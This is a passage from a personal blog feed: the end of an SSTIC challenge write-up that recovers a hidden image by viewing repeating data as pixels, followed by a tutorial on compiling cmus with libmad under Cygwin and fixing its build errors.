    &lt;span class="o"&gt;|&lt;/span&gt;      &lt;span class="nt"&gt;0x00000099&lt;/span&gt;    &lt;span class="nt"&gt;318a9501a143&lt;/span&gt; &lt;span class="nt"&gt;xor&lt;/span&gt; &lt;span class="nt"&gt;dword&lt;/span&gt; &lt;span class="cp"&gt;[&lt;/span&gt;&lt;span class="nx"&gt;edx&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="mh"&gt;0x43a10195&lt;/span&gt;&lt;span class="cp"&gt;]&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt; &lt;span class="nt"&gt;ecx&lt;/span&gt;
    &lt;span class="o"&gt;|&lt;/span&gt;      &lt;span class="nt"&gt;0x0000009f&lt;/span&gt;    &lt;span class="nt"&gt;90&lt;/span&gt;           &lt;span class="nt"&gt;nop&lt;/span&gt;
    &lt;span class="o"&gt;|&lt;/span&gt;      &lt;span class="nt"&gt;0x000000a0&lt;/span&gt;    &lt;span class="nt"&gt;ad&lt;/span&gt;           &lt;span class="nt"&gt;lodsd&lt;/span&gt; &lt;span class="nt"&gt;eax&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt; &lt;span class="nt"&gt;dword&lt;/span&gt; &lt;span class="cp"&gt;[&lt;/span&gt;&lt;span class="nx"&gt;esi&lt;/span&gt;&lt;span class="cp"&gt;]&lt;/span&gt;
    &lt;span class="o"&gt;|&lt;/span&gt;      &lt;span class="nt"&gt;0x000000a1&lt;/span&gt;    &lt;span class="nt"&gt;07&lt;/span&gt;           &lt;span class="nt"&gt;pop&lt;/span&gt; &lt;span class="nt"&gt;es&lt;/span&gt;
    &lt;span class="o"&gt;|&lt;/span&gt;      &lt;span class="nt"&gt;0x000000a2&lt;/span&gt;    &lt;span class="nt"&gt;b6ef&lt;/span&gt;         &lt;span class="nt"&gt;mov&lt;/span&gt; &lt;span class="nt"&gt;dh&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt; &lt;span class="nt"&gt;-0x11&lt;/span&gt;
    &lt;span class="o"&gt;|&lt;/span&gt;      &lt;span class="nt"&gt;0x000000a4&lt;/span&gt;    &lt;span class="nt"&gt;c462df&lt;/span&gt;       &lt;span class="nt"&gt;les&lt;/span&gt; &lt;span class="nt"&gt;esp&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt; &lt;span class="cp"&gt;[&lt;/span&gt;&lt;span class="nx"&gt;edx&lt;/span&gt; &lt;span class="o"&gt;-&lt;/span&gt; &lt;span class="mh"&gt;0x21&lt;/span&gt;&lt;span class="cp"&gt;]&lt;/span&gt;
    &lt;span class="o"&gt;|&lt;/span&gt;      &lt;span class="nt"&gt;0x000000a7&lt;/span&gt;    &lt;span class="nt"&gt;fe&lt;/span&gt;           &lt;span class="nt"&gt;invalid&lt;/span&gt;
    &lt;span class="o"&gt;|&lt;/span&gt;      &lt;span class="nt"&gt;0x000000a8&lt;/span&gt;    &lt;span class="nt"&gt;ad&lt;/span&gt;           &lt;span class="nt"&gt;lodsd&lt;/span&gt; &lt;span class="nt"&gt;eax&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt; &lt;span class="nt"&gt;dword&lt;/span&gt; &lt;span class="cp"&gt;[&lt;/span&gt;&lt;span class="nx"&gt;esi&lt;/span&gt;&lt;span class="cp"&gt;]&lt;/span&gt;
    &lt;span class="o"&gt;|&lt;/span&gt;      &lt;span class="nt"&gt;0x000000a9&lt;/span&gt;    &lt;span class="nt"&gt;318a9501a143&lt;/span&gt; &lt;span class="nt"&gt;xor&lt;/span&gt; &lt;span class="nt"&gt;dword&lt;/span&gt; &lt;span class="cp"&gt;[&lt;/span&gt;&lt;span class="nx"&gt;edx&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="mh"&gt;0x43a10195&lt;/span&gt;&lt;span class="cp"&gt;]&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt; &lt;span class="nt"&gt;ecx&lt;/span&gt;
    &lt;span class="o"&gt;|&lt;/span&gt;      &lt;span class="nt"&gt;0x000000af&lt;/span&gt;    &lt;span class="nt"&gt;90&lt;/span&gt;           &lt;span class="nt"&gt;nop&lt;/span&gt;
    &lt;span class="o"&gt;|&lt;/span&gt;      &lt;span class="nt"&gt;0x000000b0&lt;/span&gt;    &lt;span class="nt"&gt;ad&lt;/span&gt;           &lt;span class="nt"&gt;lodsd&lt;/span&gt; &lt;span class="nt"&gt;eax&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt; &lt;span class="nt"&gt;dword&lt;/span&gt; &lt;span class="cp"&gt;[&lt;/span&gt;&lt;span class="nx"&gt;esi&lt;/span&gt;&lt;span class="cp"&gt;]&lt;/span&gt;
    &lt;span class="o"&gt;|&lt;/span&gt;      &lt;span class="nt"&gt;0x000000b1&lt;/span&gt;    &lt;span class="nt"&gt;07&lt;/span&gt;           &lt;span class="nt"&gt;pop&lt;/span&gt; &lt;span class="nt"&gt;es&lt;/span&gt;
    &lt;span class="o"&gt;|&lt;/span&gt;      &lt;span class="nt"&gt;0x000000b2&lt;/span&gt;    &lt;span class="nt"&gt;b6ef&lt;/span&gt;         &lt;span class="nt"&gt;mov&lt;/span&gt; &lt;span class="nt"&gt;dh&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt; &lt;span class="nt"&gt;-0x11&lt;/span&gt;
    &lt;span class="o"&gt;|&lt;/span&gt;      &lt;span class="nt"&gt;0x000000b4&lt;/span&gt;    &lt;span class="nt"&gt;c462df&lt;/span&gt;       &lt;span class="nt"&gt;les&lt;/span&gt; &lt;span class="nt"&gt;esp&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt; &lt;span class="cp"&gt;[&lt;/span&gt;&lt;span class="nx"&gt;edx&lt;/span&gt; &lt;span class="o"&gt;-&lt;/span&gt; &lt;span class="mh"&gt;0x21&lt;/span&gt;&lt;span class="cp"&gt;]&lt;/span&gt;
    &lt;span class="o"&gt;|&lt;/span&gt;      &lt;span class="nt"&gt;0x000000b7&lt;/span&gt;    &lt;span class="nt"&gt;fe&lt;/span&gt;           &lt;span class="nt"&gt;invalid&lt;/span&gt;
    &lt;span class="o"&gt;|&lt;/span&gt;      &lt;span class="nt"&gt;0x000000b8&lt;/span&gt;    &lt;span class="nt"&gt;ad&lt;/span&gt;           &lt;span class="nt"&gt;lodsd&lt;/span&gt; &lt;span class="nt"&gt;eax&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt; &lt;span class="nt"&gt;dword&lt;/span&gt; &lt;span class="cp"&gt;[&lt;/span&gt;&lt;span class="nx"&gt;esi&lt;/span&gt;&lt;span class="cp"&gt;]&lt;/span&gt;
    &lt;span class="o"&gt;|&lt;/span&gt;      &lt;span class="nt"&gt;0x000000b9&lt;/span&gt;    &lt;span class="nt"&gt;318a9501a143&lt;/span&gt; &lt;span class="nt"&gt;xor&lt;/span&gt; &lt;span class="nt"&gt;dword&lt;/span&gt; &lt;span class="cp"&gt;[&lt;/span&gt;&lt;span class="nx"&gt;edx&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="mh"&gt;0x43a10195&lt;/span&gt;&lt;span class="cp"&gt;]&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt; &lt;span class="nt"&gt;ecx&lt;/span&gt;
    &lt;span class="o"&gt;|&lt;/span&gt;      &lt;span class="nt"&gt;0x000000bf&lt;/span&gt;    &lt;span class="nt"&gt;90&lt;/span&gt;           &lt;span class="nt"&gt;nop&lt;/span&gt;
    &lt;span class="o"&gt;|&lt;/span&gt;      &lt;span class="nt"&gt;0x000000c0&lt;/span&gt;    &lt;span class="nt"&gt;ad&lt;/span&gt;           &lt;span class="nt"&gt;lodsd&lt;/span&gt; &lt;span class="nt"&gt;eax&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt; &lt;span class="nt"&gt;dword&lt;/span&gt; &lt;span class="cp"&gt;[&lt;/span&gt;&lt;span class="nx"&gt;esi&lt;/span&gt;&lt;span class="cp"&gt;]&lt;/span&gt;
    &lt;span class="o"&gt;|&lt;/span&gt;      &lt;span class="nt"&gt;0x000000c1&lt;/span&gt;    &lt;span class="nt"&gt;07&lt;/span&gt;           &lt;span class="nt"&gt;pop&lt;/span&gt; &lt;span class="nt"&gt;es&lt;/span&gt;
    &lt;span class="o"&gt;|&lt;/span&gt;      &lt;span class="nt"&gt;0x000000c2&lt;/span&gt;    &lt;span class="nt"&gt;b6ef&lt;/span&gt;         &lt;span class="nt"&gt;mov&lt;/span&gt; &lt;span class="nt"&gt;dh&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt; &lt;span class="nt"&gt;-0x11&lt;/span&gt;
    &lt;span class="o"&gt;|&lt;/span&gt;      &lt;span class="nt"&gt;0x000000c4&lt;/span&gt;    &lt;span class="nt"&gt;c462df&lt;/span&gt;       &lt;span class="nt"&gt;les&lt;/span&gt; &lt;span class="nt"&gt;esp&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt; &lt;span class="cp"&gt;[&lt;/span&gt;&lt;span class="nx"&gt;edx&lt;/span&gt; &lt;span class="o"&gt;-&lt;/span&gt; &lt;span class="mh"&gt;0x21&lt;/span&gt;&lt;span class="cp"&gt;]&lt;/span&gt;
    &lt;span class="o"&gt;|&lt;/span&gt;      &lt;span class="nt"&gt;0x000000c7&lt;/span&gt;    &lt;span class="nt"&gt;fe&lt;/span&gt;           &lt;span class="nt"&gt;invalid&lt;/span&gt;
    &lt;span class="o"&gt;|&lt;/span&gt;      &lt;span class="nt"&gt;0x000000c8&lt;/span&gt;    &lt;span class="nt"&gt;ad&lt;/span&gt;           &lt;span class="nt"&gt;lodsd&lt;/span&gt; &lt;span class="nt"&gt;eax&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt; &lt;span class="nt"&gt;dword&lt;/span&gt; &lt;span class="cp"&gt;[&lt;/span&gt;&lt;span class="nx"&gt;esi&lt;/span&gt;&lt;span class="cp"&gt;]&lt;/span&gt;
    &lt;span class="o"&gt;|&lt;/span&gt;      &lt;span class="nt"&gt;0x000000c9&lt;/span&gt;    &lt;span class="nt"&gt;318a9501a143&lt;/span&gt; &lt;span class="nt"&gt;xor&lt;/span&gt; &lt;span class="nt"&gt;dword&lt;/span&gt; &lt;span class="cp"&gt;[&lt;/span&gt;&lt;span class="nx"&gt;edx&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="mh"&gt;0x43a10195&lt;/span&gt;&lt;span class="cp"&gt;]&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt; &lt;span class="nt"&gt;ecx&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;h2&gt;Pixel&lt;/h2&gt;
&lt;p&gt;There seems to be some repetition in this code, let's open it with the &lt;code&gt;dff&lt;/code&gt; to
see if this is an
&lt;a href="http://en.wikipedia.org/wiki/Block_cipher_mode_of_operation#Electronic_Codebook_.28ECB.29"&gt;ECB image&lt;/a&gt;.
We launch the &lt;code&gt;dff hex viewer&lt;/code&gt; and look at it as a pixel image:&lt;/p&gt;
&lt;p&gt;&lt;img alt="SSTIC pixel view, resolution 512 (default)" src="/media/2015.04/sstic_init_res_512.PNG"&gt;&lt;/p&gt;
&lt;p&gt;With the default resolution of 512 it does not look very pretty, let's variate
the resolution a bit. With a resolution of 563 we got something that encourage
us to persevere in this way:&lt;/p&gt;
&lt;p&gt;&lt;img alt="SSTIC pixel view, resolution 563" src="/media/2015.04/sstic_res_563.PNG"&gt;&lt;/p&gt;
&lt;p&gt;At the resolution of 750 we got something pretty:&lt;/p&gt;
&lt;p&gt;&lt;img alt="SSTIC pixel view, resolution 750" src="/media/2015.04/sstic_res_750.PNG"&gt;&lt;/p&gt;
&lt;h2&gt;Got you !&lt;/h2&gt;
&lt;p&gt;We just need to open it, turn it upside down and mirroring it to get the final
result:&lt;/p&gt;
&lt;p&gt;&lt;img alt="SSTIC final view, reversed" src="/media/2015.04/sstic_final.PNG"&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Very much thanks to anyfun for the big help and the dff hints.&lt;/strong&gt;&lt;/p&gt;</content><category term="challenge"></category><category term="sstic"></category><category term="security"></category></entry><entry><title>Compiling cmus for cygwin</title><link href="https://matthieukeller.com/2015/01/compiling-cmus-for-cygwin.html" rel="alternate"></link><published>2015-01-21T00:00:00+01:00</published><updated>2015-01-21T00:00:00+01:00</updated><author><name>Matthieu Keller</name></author><id>tag:matthieukeller.com,2015-01-21:/2015/01/compiling-cmus-for-cygwin.html</id><summary type="html">&lt;p&gt;&lt;img class="align-left" src="/media/2015.01/2015.01.cmus.png" alt="cmus" width="342"&gt;
I work on a Windows machine for my dally job.
On my personal desktop I use Arch Linux and i3 therefore my music player is in
curses and does not need any mouse. In fact I use
&lt;a href="https://cmus.github.io/"&gt;cmus&lt;/a&gt;. So I tried to replace my old media player
&lt;a href="https://www.clementine-player.org/"&gt;clementine&lt;/a&gt; with
&lt;a href="https://cmus.github.io/"&gt;cmus&lt;/a&gt; on Windows in &lt;a href="https://www.cygwin.com/"&gt;cygwin&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;For that we need to compile &lt;a href="https://cmus.github.io/"&gt;cmus&lt;/a&gt; from sources.
</summary><content type="html">&lt;p&gt;&lt;img class="align-left" src="/media/2015.01/2015.01.cmus.png" alt="cmus" width="342"&gt;
I work on a Windows machine for my dally job.
On my personal desktop I use Arch Linux and i3 therefore my music player is in
curses and does not need any mouse. In fact I use
&lt;a href="https://cmus.github.io/"&gt;cmus&lt;/a&gt;. So I tried to replace my old media player
&lt;a href="https://www.clementine-player.org/"&gt;clementine&lt;/a&gt; with
&lt;a href="https://cmus.github.io/"&gt;cmus&lt;/a&gt; on Windows in &lt;a href="https://www.cygwin.com/"&gt;cygwin&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;For that we need to compile &lt;a href="https://cmus.github.io/"&gt;cmus&lt;/a&gt; from sources.
&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;A &lt;a href="https://en.wikipedia.org/wiki/TL;DR"&gt;TL;DR&lt;/a&gt; is available at the end of
the article.&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;It is really easy, you just need to download the &lt;code&gt;tar.gz&lt;/code&gt; archive, untar it, and
run :&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;./configure
make
make install
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Then &lt;a href="https://cmus.github.io/"&gt;cmus&lt;/a&gt; will be directly accessible in your
&lt;a href="https://www.cygwin.com/"&gt;cygwin&lt;/a&gt; environment. You can access a file explorer
by pressing the &lt;code&gt;5&lt;/code&gt; key and then navigate through your files and add a folder
to your libarary with the &lt;code&gt;a&lt;/code&gt; key. To know more about how to use
&lt;a href="https://cmus.github.io/"&gt;cmus&lt;/a&gt; please refer to the official documentation.&lt;/p&gt;
&lt;p&gt;Okay then why a whole blog post about 3 classical commands ?
Well you may notice that when adding your folder(s) to your library not all your
files are added to it, in fact &lt;a href="https://www.cygwin.com/"&gt;cygwin&lt;/a&gt; does not
package any mp3 codec so your &lt;code&gt;flac&lt;/code&gt; files will be read by
&lt;a href="https://cmus.github.io/"&gt;cmus&lt;/a&gt; but not the &lt;code&gt;mp3&lt;/code&gt; one (as long as you have
install the flac codec).&lt;/p&gt;
&lt;p&gt;In oder to read mp3 files with &lt;a href="https://cmus.github.io/"&gt;cmus&lt;/a&gt; we need to
install (so to build) a library that read this file format: libmad&lt;/p&gt;
&lt;h1&gt;libmad&lt;/h1&gt;
&lt;p&gt;First of all we need to download the source package from the official web site :
&lt;a href="http://www.underbit.com/products/mad/"&gt;http://www.underbit.com/products/mad/&lt;/a&gt;
now we extract the files and make the classical commands:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;./configure
make
make install
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;You may encounter the "guess build" error:&lt;/p&gt;
&lt;h2&gt;guess error&lt;/h2&gt;
&lt;p&gt;This append during the make command&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="n"&gt;configure&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="n"&gt;error&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="n"&gt;cannot&lt;/span&gt; &lt;span class="n"&gt;guess&lt;/span&gt; &lt;span class="n"&gt;build&lt;/span&gt; &lt;span class="n"&gt;type&lt;/span&gt;&lt;span class="o"&gt;;&lt;/span&gt; &lt;span class="n"&gt;you&lt;/span&gt; &lt;span class="n"&gt;must&lt;/span&gt; &lt;span class="n"&gt;specify&lt;/span&gt; &lt;span class="n"&gt;one&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;You may need the &lt;code&gt;automake&lt;/code&gt; package and moreover you may need to replace the two
old files config.guess and config.sub from libmad with the new ones downloadable
at : &lt;a href="ftp://ftp.gnu.org/pub/gnu/config/README"&gt;ftp://ftp.gnu.org/pub/gnu/config/README&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;An other classical error is the &lt;code&gt;-fforce-memi&lt;/code&gt; one:&lt;/strong&gt;&lt;/p&gt;
&lt;h2&gt;&lt;code&gt;-fforce-mem&lt;/code&gt; gcc error&lt;/h2&gt;
&lt;p&gt;This error is characterize by the following trace:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="n"&gt;gcc&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="n"&gt;error&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="n"&gt;unrecognized&lt;/span&gt; &lt;span class="n"&gt;command&lt;/span&gt; &lt;span class="n"&gt;line&lt;/span&gt; &lt;span class="n"&gt;option&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;-fforce-mem&amp;#39;&lt;/span&gt;
&lt;span class="n"&gt;Makefile&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;383&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="n"&gt;recipe&lt;/span&gt; &lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="n"&gt;target&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;version.lo&amp;#39;&lt;/span&gt; &lt;span class="n"&gt;failed&lt;/span&gt;
&lt;span class="n"&gt;make&lt;/span&gt;&lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;2&lt;/span&gt;&lt;span class="o"&gt;]:&lt;/span&gt; &lt;span class="o"&gt;***&lt;/span&gt; &lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="n"&gt;version&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;lo&lt;/span&gt;&lt;span class="o"&gt;]&lt;/span&gt; &lt;span class="n"&gt;Error&lt;/span&gt; &lt;span class="mi"&gt;1&lt;/span&gt;
&lt;span class="n"&gt;make&lt;/span&gt;&lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;2&lt;/span&gt;&lt;span class="o"&gt;]:&lt;/span&gt; &lt;span class="n"&gt;Leaving&lt;/span&gt; &lt;span class="n"&gt;directory&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;/cygdrive/c/Users/user/Downloads/libmad-0.15.1b&amp;#39;&lt;/span&gt;
&lt;span class="n"&gt;Makefile&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;424&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="n"&gt;recipe&lt;/span&gt; &lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="n"&gt;target&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;all-recursive&amp;#39;&lt;/span&gt; &lt;span class="n"&gt;failed&lt;/span&gt;
&lt;span class="n"&gt;make&lt;/span&gt;&lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="o"&gt;]:&lt;/span&gt; &lt;span class="o"&gt;***&lt;/span&gt; &lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="n"&gt;all&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;recursive&lt;/span&gt;&lt;span class="o"&gt;]&lt;/span&gt; &lt;span class="n"&gt;Error&lt;/span&gt; &lt;span class="mi"&gt;1&lt;/span&gt;
&lt;span class="n"&gt;make&lt;/span&gt;&lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="o"&gt;]:&lt;/span&gt; &lt;span class="n"&gt;Leaving&lt;/span&gt; &lt;span class="n"&gt;directory&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;/cygdrive/c/Users/user/Downloads/libmad-0.15.1b&amp;#39;&lt;/span&gt;
&lt;span class="n"&gt;Makefile&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;249&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="n"&gt;recipe&lt;/span&gt; &lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="n"&gt;target&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;all&amp;#39;&lt;/span&gt; &lt;span class="n"&gt;failed&lt;/span&gt;
&lt;span class="n"&gt;make&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="o"&gt;***&lt;/span&gt; &lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="n"&gt;all&lt;/span&gt;&lt;span class="o"&gt;]&lt;/span&gt; &lt;span class="n"&gt;Error&lt;/span&gt; &lt;span class="mi"&gt;2&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;From GCC 4.3 release notes:&lt;/p&gt;
&lt;p&gt;&lt;em&gt;The -fforce-mem option has been removed because it has had no effect in the
last few GCC releases.&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;So we need to remove this option from our configure script, &lt;a href="http://www.linuxfromscratch.org/blfs/view/svn/multimedia/libmad.html"&gt;some people wrote a
patch for it&lt;/a&gt;
but it is just a &lt;code&gt;sed&lt;/code&gt; command&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;sed -i &amp;#39;/-fforce-mem/d&amp;#39; configure
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;We need to redo the 3 basics commands:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;./configure
make
make install
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;&lt;strong&gt;At this point you should not have any error, but a classical one is the
missing library error:&lt;/strong&gt;&lt;/p&gt;
&lt;h2&gt;missing library error&lt;/h2&gt;
&lt;p&gt;The error is indicating the precise missing library (here &lt;code&gt;libtool&lt;/code&gt;):&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;Makefile.am:27: Libtool library used but `LIBTOOL&amp;#39; is undefined
Makefile.am:27:
Makefile.am:27: The usual way to define `LIBTOOL&amp;#39; is to add `AC_PROG_LIBTOOL&amp;#39;
Makefile.am:27: to `configure.ac&amp;#39; and run `aclocal&amp;#39; and `autoconf&amp;#39; again.
Makefile:256: recipe for target &amp;#39;Makefile.in&amp;#39; failed
make: *** [Makefile.in] Error 1
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;And we just need to install the missing library using &lt;a href="https://www.cygwin.com/"&gt;cygwin&lt;/a&gt; package manager.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Now we have libmad install in &lt;code&gt;/usr/local/lib/&lt;/code&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;h1&gt;cmus&lt;/h1&gt;
&lt;p&gt;But our installation is not completed we need to recompile
&lt;a href="https://cmus.github.io/"&gt;cmus&lt;/a&gt; with the support
of this new library and if you just launch the 3 basic commands it will not
work. In fact, gcc does not search libraries in &lt;code&gt;/usr/local&lt;/code&gt; by default. We need
to add a flag at the configure step:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;./configure CPPFLAGS=-I/usr/local/include LDFLAGS=-L/usr/local/lib
make
make install
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;And now you can launch &lt;a href="https://cmus.github.io/"&gt;cmus&lt;/a&gt; and re-add your mp3
files and &lt;strong&gt;it works!&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;You can still have some erros, mostly with the newest cygwin versions.&lt;/p&gt;
&lt;h2&gt;recipe for target 'ape.o' failed&lt;/h2&gt;
&lt;p&gt;&lt;em&gt;This error was first mention by buzzbo on
&lt;a href="https://github.com/cmus/cmus/issues/343"&gt;github&lt;/a&gt; and resolved by mahkoh.
Thanks to them.&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;After the &lt;code&gt;./configure&lt;/code&gt;, the &lt;code&gt;make&lt;/code&gt; may output something like:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;   CC     ape.o
In file included from ape.c:23:0:
xmalloc.h: In function &amp;#39;xstrndup&amp;#39;:
xmalloc.h:79:2: error: implicit declaration of function &amp;#39;strndup&amp;#39; [-Werror=implicit-function-declaration]
  char *s = strndup(str, n);
  ^
xmalloc.h:79:12: warning: incompatible implicit declaration of built-in function &amp;#39;strndup&amp;#39;
  char *s = strndup(str, n);
            ^
cc1: some warnings being treated as errors
scripts/lib.mk:66: recipe for target &amp;#39;ape.o&amp;#39; failed
make: *** [ape.o] Error 1
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;This error is due to an implicit function declaration that is incorrect. Add
this after all the includes of the offending files (&lt;code&gt;xmalloc.h&lt;/code&gt;):&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="kt"&gt;char&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="nf"&gt;strndup&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="k"&gt;const&lt;/span&gt; &lt;span class="kt"&gt;char&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="n"&gt;s&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="kt"&gt;size_t&lt;/span&gt; &lt;span class="n"&gt;n&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;h3&gt;Workflow - TL;DR&lt;/h3&gt;
&lt;p&gt;Here is the &lt;a href="https://en.wikipedia.org/wiki/TL;DR"&gt;TL;DR&lt;/a&gt;.&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Cygwin dependencies&lt;/li&gt;
&lt;li&gt;flac-devel&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;ncurses&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Install &lt;a href="http://www.underbit.com/products/mad/"&gt;libmad&lt;/a&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;change the &lt;code&gt;config.gess&lt;/code&gt; and &lt;code&gt;config.sub&lt;/code&gt; files with the one from &lt;a href="http://ftp.gnu.org/gnu/config/README"&gt;this readme&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;patch the configuration to not use the &lt;code&gt;-fforce-mem&lt;/code&gt; option with sed: &lt;code&gt;sed -i '/-fforce-mem/d' configure&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;run the 3 classical commands:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;./configure&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;make&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;make install&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Install &lt;a href="https://cmus.github.io/"&gt;cmus&lt;/a&gt; from source and add the &lt;code&gt;gcc&lt;/code&gt; flags to load libraries in /usr/local:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;./configure CPPFLAGS=-I/usr/local/include LDFLAGS=-L/usr/local/lib&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;make&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;make install&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;em&gt;If you run a classical linux distribution to install cmus use &lt;code&gt;aptitude install
cmus&lt;/code&gt; or &lt;code&gt;pacman -S cmus&lt;/code&gt;. It is so much easier!&lt;/em&gt;&lt;/p&gt;</content><category term="cygwin"></category><category term="cmus"></category></entry><entry><title>Switching to Horde</title><link href="https://matthieukeller.com/2014/12/switching-to-horde.html" rel="alternate"></link><published>2014-12-27T00:00:00+01:00</published><updated>2014-12-27T00:00:00+01:00</updated><author><name>Matthieu Keller</name></author><id>tag:matthieukeller.com,2014-12-27:/2014/12/switching-to-horde.html</id><summary type="html">&lt;p&gt;I host my own services with a web access, for my mail and calendar I used
&lt;a href="http://roundcube.org"&gt;Roundcube&lt;/a&gt; a wonderful webmail and
&lt;a href="http://agendav.org"&gt;agendav&lt;/a&gt; for my calendar. Nevertheless I am used to have
